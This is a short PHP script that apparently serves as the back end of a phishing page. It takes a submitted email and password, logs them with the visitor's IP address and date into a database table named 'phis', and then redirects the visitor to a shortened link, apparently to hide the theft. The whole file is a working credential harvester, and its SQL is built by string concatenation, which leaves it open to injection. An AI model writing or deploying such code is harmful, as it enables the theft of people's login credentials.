<?php

require_once('db-connection.php');
$t = time();
$email = $_POST['email'];
$password = $_POST['password'];

if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    		$ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    		$ip_address = $_SERVER['REMOTE_ADDR'];
}
$time = date("Y-m-d",$t);
$query = "INSERT INTO `phis`(`Email`, `Password`, `Time`,`IP`) VALUES ('$email','$password','$time','$ip_address')";
$link->query($query);
header ('Location:http://ow.ly/ZIu2P');
exit;

?>
